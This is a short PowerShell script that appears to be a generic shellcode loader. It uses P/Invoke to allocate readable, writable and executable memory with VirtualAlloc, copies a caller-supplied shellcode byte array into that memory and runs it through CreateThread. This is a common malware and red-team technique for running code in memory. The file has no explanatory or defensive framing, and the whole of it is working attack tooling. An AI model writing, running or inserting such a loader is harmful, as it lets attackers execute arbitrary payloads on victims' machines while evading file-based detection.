param(
    [Parameter(Mandatory = $true)]
    [Byte[]] $Shellcode
)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );
}
"@

$ShellcodeSize = $Shellcode.Length
$ShellcodeAddress = [Win32]::VirtualAlloc([IntPtr]::Zero, $ShellcodeSize, 0x3000, 0x40)

if ($ShellcodeAddress -eq [IntPtr]::Zero) {
    Write-Error "Memory allocation failed!"
    exit 1
}

[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ShellcodeAddress, $ShellcodeSize)

$ThreadId = [IntPtr]::Zero
$ThreadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $ShellcodeAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)

if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Error "Thread creation failed!"
    exit 1
}

[Win32]::WaitForSingleObject($ThreadHandle, 0xFFFFFFFF)

Write-Host "Shellcode executed successfully."
